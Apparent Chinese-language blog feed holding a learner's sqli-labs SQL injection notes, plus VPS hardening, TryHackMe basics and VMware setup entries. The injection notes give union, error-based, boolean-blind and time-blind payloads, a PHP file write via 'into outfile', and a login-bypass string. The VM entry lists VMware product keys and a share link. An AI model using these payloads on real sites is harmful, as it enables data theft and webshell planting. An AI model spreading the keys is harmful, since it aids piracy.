id="正常使用"><a href="#正常使用" class="headerlink" title="正常使用:"></a>正常使用:</h4><p><code>select * from stu where id = 1 union select * from coach where id = 1</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">表单stu<br></code></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>name</th><th>age</th></tr></thead><tbody><tr><td>1</td><td>xiaoming</td><td>12</td></tr></tbody></table><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">表单coach<br></code></pre></td></tr></table></figure><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>dk</td></tr></tbody></table><p>结果会回显stu的id,name,age的内容和coach的id和name的内容,但是coach少了一列,而union查询必须要前后列一致,所以需要补齐查询</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> stu <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> *,<span class="hljs-number">123</span> <span class="hljs-keyword">from</span> coach <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>这样查询的结果就都是三列了</p><h4 id="注入查询"><a href="#注入查询" class="headerlink" title="注入查询:"></a>注入查询:</h4><p>通常在页面内的回显只会是返回查询stu的内容而不是coach的内容,所以可以查询stu中空的内容来显示coach的内容,比如查询stu的id为-1,在查询时使用union 查询,通常会查询数据库名或者服务器版本信息等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> stu <span class="hljs-keyword">where</span> id = <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,passwd,<span class="hljs-keyword">version</span><br></code></pre></td></tr></table></figure><h2 id="字符类型"><a href="#字符类型" class="headerlink" title="字符类型"></a>字符类型</h2><p>如果输入的变量是字符类型(string),那么查询之后要加上单引号或者双引号,id&#x3D;’1’这样的</p><p>如果输入的变量是整型(int),那么不需要加上引号或各种括号进行闭合,比如id&#x3D;1</p><h2 id="列的数量"><a href="#列的数量" class="headerlink" title="列的数量"></a>列的数量</h2><p>order by或者group by都可以,group by可能会出现一些奇怪的东西,但是order by会被waf记录,而group by则不会</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><h5 id="正常使用-1"><a href="#正常使用-1" class="headerlink" title="正常使用"></a>正常使用</h5><p>比如一个数据表有每个人的成绩,第一列是学号,第二列是姓名,第三列是成绩(score),那么<code>order by 3</code>跟<code>order by score</code>就是等效的,是按照学生的成绩对表单进行排序</p><h5 id="注入查询-1"><a href="#注入查询-1" class="headerlink" title="注入查询"></a>注入查询</h5><p>这个表单只有三列,到order by 3还可以正常显示,order by 4就会报错,所以表明表单只有3列</p><h4 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h4><h5 id="正常使用-2"><a href="#正常使用-2" class="headerlink" title="正常使用"></a>正常使用</h5><p>表单有三列,第一列是名字,第二列是性别(gender),第三列是成绩(score),通常group by会和其它查询函数联合使用,比如avg() average平均值,联合查询后,就会只有两列,group将按照gender将表单的所有行分成男女两组,并分别求平均值</p><h5 id="注入查询-2"><a href="#注入查询-2" class="headerlink" title="注入查询"></a>注入查询</h5><p>同上</p><h2 id="报错查询"><a href="#报错查询" class="headerlink" title="报错查询"></a>报错查询</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=<span class="hljs-number">100</span>&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<br>extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0</span>x7e,(<span class="hljs-keyword">select</span> database())))<br>,<span class="hljs-number">3</span> <span class="hljs-comment">--+                                         </span><br></code></pre></td></tr></table></figure><p>用于查询xml数据,正确用法是extractvalue(数据类型,数据路径)</p><p>这里只能用concat而不能用group_concat(),concat是单纯将两个及以上字符连接起来,而group_concat是将查询的结果连接起来,而且group_concat()后要跟上group by才能正常使用,而<code>select group_concat(table_name) from information_schema.tables where table_schema=database()</code>可以不跟group by就直接使用是因为information_schema.tables本身就是一个group(理解成隐式群组)</p><p>必须要用concat()进行联合查询是因为extractvalue()必须是数据类型和数据路径,在数据类型这里可以选择错误的内容,而数据路径要更改为需要查询的内容,直接select是进行一个查询,而这里需要一个字符串(用括号将select查询包裹起来也不可以,不知道为什么)</p><h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="Lession1"><a href="#Lession1" class="headerlink" title="Lession1"></a>Lession1</h2><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230419212646.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230419212646.png" alt="img"></a><br>1.先判断是否有sql注入<br><code>?id=1</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230419213507.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230419213507.png" alt="img"></a></p><p>2.用sqlmap跑一下试试(主要是没看懂教程网课说的是什么意思)<br><code>sqlmap.py -u http://localhost/sqli-labs/Less-1/?id=1</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171058.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171058.png" alt="img"></a><br>返回给我四个类型的注入</p><h3 id="基于布尔型盲注"><a href="#基于布尔型盲注" class="headerlink" title="基于布尔型盲注"></a>基于布尔型盲注</h3><p>1.概念:构造可以判断为真或假的SQL逻辑语句,根据页面返回的结果是否正常来判断语句结果是真或假。典型的构造方式是使用“AND 1&#x3D;1”(真)或“AND 1&#x3D;2”(假)。(源自claude)<br>就是在url界面输入值后,是否会在页面进行显示内容,比如本题,进行注入<code>&#39;and 1=1 --+</code>此时结果为真,可以返回id&#x3D;1的值<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171334.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171334.png" alt="img"></a>,如果结果为假,例如1&#x3D;2,由于是and语句,前后都为真才可执行,id&#x3D;1为真,1&#x3D;2为假,所以语句不执行,则返回空值<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171459.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171459.png" alt="img"></a><br>2.步骤:确认注入点、信息收集和利用(同样来源于claude)<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171822.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420171822.png" alt="img"></a>现在应该还学不到那种程度,现在可以利用简单的函数来判断一些数据,比如length(database())这个函数,可以判断数据库名称的长度是多少,比如现在的数据库(database)的名称是security,那么length(database())返回值就是8(应该可以配合burpsuite的爆破使用,爆破出正确的值,然后根据这个正确的值注入,后面的ascii同理)<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420170754.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420170754.png" alt="img"></a><br>ascii判断:?id&#x3D;1’ and ascii(substr(database(),1,1))&#x3D;33 –+ 比如security这个数据库第一个字母为s,ascii码值为115,所以<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420200757.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230420200757.png" alt="img"></a><br>(剩下的还没学明白)</p><h3 id="注释符号"><a href="#注释符号" class="headerlink" title="注释符号"></a>注释符号</h3><p>单引号报错<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421184833.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421184833.png" alt="img"></a><br>两个单引号可以<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421184743.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421184743.png" alt="img"></a><br>原语句<code>select * from table where id = &#39;$id&#39; </code>假设现有的两个’分别记为1号,2号<br>注入语句为<code>?id=1&#39;</code> 这里的’记为3号,注入后<code>select * from table where id = &#39;$id&#39;&#39;</code>,此时’分别为1,3,2号,那么拼接后的语句1,2号为引号但是3号没有与之配对的,所以会报错,但注入双引号之后,就是1332,12正常配对,33配对引起的内容为空,但是不会报错(传入参数的分号配对优先级低于原来的’’,所以前面可以用3号分号跟原来的1号配对,而2号则被注释掉了)<br><code>select * from table where id = &#39;1&#39;and 1=2&#39;&#39;</code></p><h2 id="Lession2"><a href="#Lession2" class="headerlink" title="Lession2"></a>Lession2</h2><table><thead><tr><th>注入语句</th><th>y&#x2F;n</th></tr></thead><tbody><tr><td><code>?id=1 and 1=1--+</code></td><td>y</td></tr><tr><td><code>?id=1&#39; and 1=1--+</code></td><td>n</td></tr><tr><td><code>?id=1&#39; and 1=1</code></td><td>n</td></tr><tr><td><code>?id=1 and 1=1</code></td><td>y</td></tr></tbody></table><p>所以后台语句为select * from table where id &#x3D; $id</p><h2 id="Lession3"><a href="#Lession3" class="headerlink" title="Lession3"></a>Lession3</h2><p>单引号起手尝试<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421201502.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421201502.png" alt="img"></a><br>报错,但是看到报错里有),推测原查询语句为<code>select * from table where id = (&#39;1&#39;)</code>或<code>select * from table where id = &#39;(1)&#39;</code></p><p>先尝试<code>?id=1)&#39; and 1=2 --+</code>,这里猜测原语句为<code>select * from table where id = &#39;(1)&#39;</code> 如果是这个则注入之后就是<code>select * from table where id = &#39;(1)&#39;and 1=2--+)&#39;</code>如果是这个,则原来的括号和引号被注释掉<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421201837.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421201837.png" alt="img"></a>报错,所以这个不对,那么猜测原语句为<code>select * from table where id = (&#39;1&#39;)</code><br>然后再尝试注入<code>?id=1&#39;) and 1=2 --+</code>,如果是这个则注入后为&#96;&#96;&#96;select * from table where id &#x3D; (‘1’)and 1&#x3D;2–+)’</p><h2 id="Lession4"><a href="#Lession4" class="headerlink" title="Lession4"></a>Lession4</h2><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421203644.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230421203644.png" alt="img"></a><br>原语句是id&#x3D;($id)</p><h2 id="Lession5"><a href="#Lession5" class="headerlink" title="Lession5"></a>Lession5</h2><p>找原语句还是没什么太大问题,但是看着不少教程从这一关开始搞爆破了,所以跟着走一遍<br>注入代码<code>?id=1&#39; and 1=2--+</code>不报错,但是不显示内容,所以原语句是<code>select * from table where id = &#39;$id&#39;</code><br>爆破数据库名称 <code>substr(database(),1,1)</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422125419.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422125419.png" alt="img"></a><br>不是s的情况<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422125453.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422125453.png" alt="img"></a><br>但是bp还没搞明白怎么逐个字母爆破,所以改成ascii码值,a-z的ascii码值分别是97-122,所以注入语句改为<code>?id=1&#39; and ascii(substr(database(),1,1))=115</code><br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422125722.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br>以及非115的情况<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422125757.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422125757.png" alt="img"></a></p><p>现在用bp爆破一遍<br>1.代理抓包<br>2.右键,发送到intruder<br>3.清除原有payload,选定115为新的payload<br>4.<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422130007.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422130007.png" alt="img"></a><br>5.爆破<a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422130034.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422130034.png" alt="img"></a></p><p>捯饬了一下找到怎么用字母爆破了<br>前三步一样,但要用ascii()包起来原来的参数,payload集还是1,类型由数值改为简单列表,点击payload设置&gt;&gt;从列表添加<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422133730.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230422133730.png" alt="img"></a></p><h2 id="Lession6"><a href="#Lession6" class="headerlink" title="Lession6"></a>Lession6</h2><p>一开始傻了,以为双引号就是两个单引号,一直找不到语法报错提示,改成shift+”就有正常报错提示了,跟第五关差不多</p><h2 id="Lession7-GET-Dump-into-outfile"><a href="#Lession7-GET-Dump-into-outfile" class="headerlink" title="Lession7 GET-Dump into outfile"></a>Lession7 GET-Dump into outfile</h2><p>这个可以注入文件 dump是临时存储的数据,outfile是上传文件,就是通过url框向服务器传入一个文件,文件的内容就是在url框里查询出来的内容<br>注入语句<code>?id=1&#39;)) union select 1,3,4 into outfile &quot;E:\\phpstudy\\PhpStudy2018\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\a.php&quot;--+</code><br>union必须带 后面只能穿3个参数,可能是因为源文件就这么设置的 into outfile是固定语句<br>踩得一些坑:<br><code>SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</code>查看状态 ,如果是空值就可以成功注入,如果是null则不行<br>如果是null的话需要打开mysql.ini文件(claude说的是mysql.cnf),添加<code>secure_file_priv = &#39;&#39;</code><br>一开始添加在文件的最下面,但是不行,然后加在[mysqld]的下面,重新重启phpstudy可以注入了</p><h2 id="Lession8"><a href="#Lession8" class="headerlink" title="Lession8"></a>Lession8</h2><p>又是布尔盲注,但看攻略也没发现跟前面的基于错误报错有什么区别,试一下爆出版本号<br>mid()函数<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230423193845.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br><code>?id=1&#39; and mid(version(),1,1)=5 --+</code><br><code>?id=1&#39; and mid(version(),1,2)=5.0 --+</code></p><h2 id="Lession9"><a href="#Lession9" class="headerlink" title="Lession9"></a>Lession9</h2><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230423211017.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230423211017.png" alt="img"></a><br>不知道为什么0 1都是一样的you are in…,再用sqlmap跑一次<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230423213626.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br>用时间注入,从29秒开始可以注入,应该是<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230423213606.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br><code>?id=1&#39;and if(length(database())=7,sleep(3),1) --+</code><br>if(判断,如果对则,错则) 错的返回值(结果集)填什么都可以,但必须要填,就比如<code>select * from table where id = 1</code>返回值就是id&#x3D;1的所有字段,所有字段就是结果集<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230423215539.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230423215539.png" alt="img"></a></p><h2 id="Lession10"><a href="#Lession10" class="headerlink" title="Lession10"></a>Lession10</h2><p>跟9差不多,但是双引号</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=1&quot;and <span class="hljs-keyword">if</span>(<span class="hljs-attribute">1</span>=2,sleep(50),1) --+<br></code></pre></td></tr></table></figure><h2 id="Lession11-Post"><a href="#Lession11-Post" class="headerlink" title="Lession11 Post"></a>Lession11 Post</h2><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230425201641.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230425201641.png" alt="img"></a></p><p>一上来界面就不一样了,变成一个输入账密的代码框,一开始各种乱试瞎猜都没成功,唯一一次有点沾边的想法是username框不能给注释掉,要不然password就输入不进去了,搜了教程才想明白</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">where</span> <span class="hljs-type">name</span>=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> = <span class="hljs-string">&#x27;$password&#x27;</span><br></code></pre></td></tr></table></figure><p>所以想要注入应该是在username框输入 <code>admin&#39; and 1=&#39;1</code> 这样admin左边原来有一个分号,右边在代码框输入了一个分号,而’1 右边有原来属于’$username’的右边的分号,这样就齐活了<br><code>select * from table where uname=&#39;$username&#39; or 1=1 and passwd = &#39;$password&#39;</code>这个语句包括了三个判断条件,$username存在,1&#x3D;1,$password存在,但是因为1&#x3D;1为永真,所以剩下两个只要一个有就能查出来</p><h2 id="Lession12"><a href="#Lession12" class="headerlink" title="Lession12"></a>Lession12</h2><p>单引号边双引号</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>vps</title>
    <link href="/2023/08/20/vps/"/>
    <url>/2023/08/20/vps/</url>
    
    <content type="html"><![CDATA[<h1 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h1><h2 id="连接前的问题"><a href="#连接前的问题" class="headerlink" title="连接前的问题"></a>连接前的问题</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ssh</span>-keygen -R <span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure><h2 id="进入后"><a href="#进入后" class="headerlink" title="进入后"></a>进入后</h2><h3 id="基础更新"><a href="#基础更新" class="headerlink" title="基础更新"></a>基础更新</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">apt update </span><br><span class="hljs-attribute">apt upgrade -y</span><br></code></pre></td></tr></table></figure><h3 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h3><h4 id="改端口"><a href="#改端口" class="headerlink" title="改端口"></a>改端口</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>ssh/sshd_config<br>找到port 更改<br>sudo service sshd restart   重启<br>ssh root@ip -p 端口号<br></code></pre></td></tr></table></figure><h4 id="改密码-加用户"><a href="#改密码-加用户" class="headerlink" title="改密码,加用户"></a>改密码,加用户</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">passwd</span><br><span class="hljs-attribute">adduser taosu</span><br></code></pre></td></tr></table></figure><h4 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">apt</span> update &amp;&amp; apt install sudo<br><span class="hljs-attribute">visudo</span><br><span class="hljs-comment">#在root all.....下一行加</span><br><span class="hljs-attribute">taosu</span> <span class="hljs-literal">ALL</span>=(<span class="hljs-literal">ALL</span>) NOPASSWD: <span class="hljs-literal">ALL</span><br><span class="hljs-comment">#禁止root登陆</span><br><span class="hljs-attribute">vim</span> /etc/ssh/sshd_config<br><span class="hljs-comment">#找到 PermitRootLogin Yes 这一项，然后把它后面的设定值改为 no</span><br><span class="hljs-attribute">sudo</span> service sshd restart<br><br><span class="hljs-attribute">sudo</span> apt install net-tools<br><span class="hljs-attribute">sudo</span> apt-get install ufw<br><span class="hljs-attribute">sudo</span> ufw <span class="hljs-literal">allow</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ufw</span> status<br><span class="hljs-attribute">ufw</span> default <span class="hljs-literal">deny</span> incoming<br><span class="hljs-attribute">sudo</span> ufw default <span class="hljs-literal">allow</span> outgoing<br><span class="hljs-attribute">sudo</span> ufw <span class="hljs-literal">allow</span> http<br><span class="hljs-attribute">sudo</span> ufw <span class="hljs-literal">allow</span> https<br><span class="hljs-attribute">sudo</span> ufw enable<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>thm</title>
    <link href="/2023/08/20/thm/"/>
    <url>/2023/08/20/thm/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h1><ol><li><p>whoami:查看当前用户信息(比如kali或者root)<br>2 .history:查看输入过的命令</p></li><li><p>ls:(list)查看文件,但是不能查看隐藏的文件,如果要查看隐藏的文件可以ls -a</p></li><li><p>cat (文件名):cat的全拼是concatenate,作用是查看文件内容</p></li><li><p>ssh (name)@(ip地址):比如 <code>ssh taosu@1.1.1.1</code></p></li><li><p>su - (name):切换同一ip地址下的用户账号</p></li><li><p>exit:退出ssh连接</p></li><li><p>nmap (ip段):network mapper(网络扫描器),可以查看ip地址所运行的对外可见的程序</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">FTP服务器：FTP 代表文件传输协议，用于在机器之间传输文件。<br>SSH 服务器：SSH 代表 Secure <span class="hljs-keyword">Shell</span><span class="language-bash">，用于安全远程登录。换句话说，它允许您在远程系统上安全地执行命令。</span><br>HTTP服务器：HTTP 代表超文本传输协议，用于网络。每当您浏览网页时，您都在使用 HTTP 或 HTTPS。HTTPS 是 HTTP 的安全（加密）版本。<br></code></pre></td></tr></table></figure></li><li><p>ftp (ip地址) (端口):建立ftp联系,通过FTP协议连接远程FTP服务器,实现文件上传、下载和管理。<br>在ftp (ip)后,会提示输入用户名,可以尝试输入anonymous(匿名),有些服务器允许匿名登陆,但权限较低,通常是只读<br>ls展示文件,用get打开文件 例如<code>get 1.txt</code></p></li><li><p>pwd:print working directory,查看当前所在的文件位置</p></li><li><p>cd:切换当前所在位置,例如<code>cd /home</code></p></li></ol><h1 id="SOC"><a href="#SOC" class="headerlink" title="SOC"></a>SOC</h1><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><p>服务器日志<br>DNS活动<br>防火墙日志<br>DHCP日志</p>]]></content>
    
    
    <categories>
      
      <category>thm</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>虚拟机</title>
    <link href="/2023/08/20/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    <url>/2023/08/20/%E8%99%9A%E6%8B%9F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="虚拟机及系统"><a href="#虚拟机及系统" class="headerlink" title="虚拟机及系统"></a>虚拟机及系统</h1><h2 id="虚拟机及扩展"><a href="#虚拟机及扩展" class="headerlink" title="虚拟机及扩展"></a>虚拟机及扩展</h2><h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><ol><li>虚拟化层:在物理主机之上添加一层软件抽象层,虚拟出一套计算机硬件平台,包括CPU、内存、存储、网络等组件。</li><li>Guest OS:在虚拟的硬件平台上安装客户操作系统(Guest OS),对客户操作系统来说,它认为自己在运行于一台独立的物理计算机上。</li><li>虚拟机监控器(Hypervisor):负责创建、运行和管理虚拟机,它通过软件模拟物理硬件来运行和控制虚拟机。常见的虚拟机监控器有VMWare、VirtualBox、KVM等。</li><li>物理主机(Host):提供计算、存储和网络等物理资源,用于运行虚拟机监控器和客户操作系统。</li></ol><h4 id="特性及优点"><a href="#特性及优点" class="headerlink" title="特性及优点"></a>特性及优点</h4><ol><li>运行多系统:可以在一台物理主机上同时运行多个操作系统,如Windows、Linux等。</li><li>隔离性:每个虚拟机之间相互隔离,如安全漏洞影响只限于单个虚拟机内。</li><li>容易备份:可以很容易为整个虚拟机创建备份或快照。</li><li>用于软件测试:可以用来测试不同的软件和操作系统,避免在真实环境中造成影响。</li></ol><h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p><a href="https://customerconnect.vmware.com/cn/downloads/details?downloadGroup=WKST-PLAYER-1625&productId=1039&rPId=98562">https://customerconnect.vmware.com/cn/downloads/details?downloadGroup=WKST-PLAYER-1625&amp;productId=1039&amp;rPId=98562</a><br>产品密钥(16版本):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ZF3R0</span>-FHED2-M80TY-<span class="hljs-number">8</span>QYGC-NPKYF<br><span class="hljs-attribute">YF390</span>-<span class="hljs-number">0</span>HF8P-M81RQ-<span class="hljs-number">2</span>DXQE-M2UT6<br><span class="hljs-attribute">ZF71R</span>-DMX85-<span class="hljs-number">08</span>DQY-<span class="hljs-number">8</span>YMNC-PPHV8<br></code></pre></td></tr></table></figure><p>17版本及秘钥:<br>链接：<a href="https://pan.baidu.com/s/1-x9RRblQnboROXDTateq4g?pwd=cguo">https://pan.baidu.com/s/1-x9RRblQnboROXDTateq4g?pwd=cguo</a><br>提取码：cguo</p><h4 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h4><h5 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h5><p>Docker是一个开源的应用容器引擎</p><ol><li>隔离机制:虚拟机通过hypervisor在硬件层面实现资源隔离,Docker使用Linux内核的容器技术(namespace和cgroups)在操作系统层面实现隔离。Docker更轻量,资源开销更小。</li><li>镜像机制:Docker通过分层的镜像机制实现应用环境的快速构建和部署,镜像体积更小,更轻量。虚拟机需要安装完整操作系统。</li><li>启动速度:Docker镜像启动可以在秒级完成,虚拟机需要分钟级的启动时间。这使得Docker更适合微服务架构。</li></ol><h5 id="k8s-Kubernetes"><a href="#k8s-Kubernetes" class="headerlink" title="k8s(Kubernetes)"></a>k8s(Kubernetes)</h5><p>很多个docker在运行,k8s是他们的集成管理器</p><h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><ul><li><p>Windows   大家都在用的</p></li><li><p>Mac   大家都在用的</p></li><li><p>Linux</p></li><li><ul><li><p>Red Hat系(企业,服务器多用)</p></li><li><ul><li>Red Hat</li><li>CentOS</li><li>Fedora</li></ul></li><li><p>Debian系(个人开发用)</p></li><li><ul><li>Ubuntu</li><li>Debian</li></ul></li><li><p>高度定制化的发行版本</p></li><li><ul><li>kali</li><li>Arch(注重简洁、定制性和最新软件,适合有一定Linux经验的用户)</li></ul></li></ul></li></ul><h1 id="安装win10"><a href="#安装win10" class="headerlink" title="安装win10"></a>安装win10</h1><h2 id="安装iso"><a href="#安装iso" class="headerlink" title="安装iso"></a>安装iso</h2><p><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507191613.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br>选择典型,下一步<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507191827.png"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="img"></a><br>选择win10的镜像,下一步<br><a href="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192013.png"><img src="https://taosu0216-1314485098.cos.ap-beijing.myqcloud.com/20230507192013.png" alt="img"></a><br>选择专业版,下一步<br><a 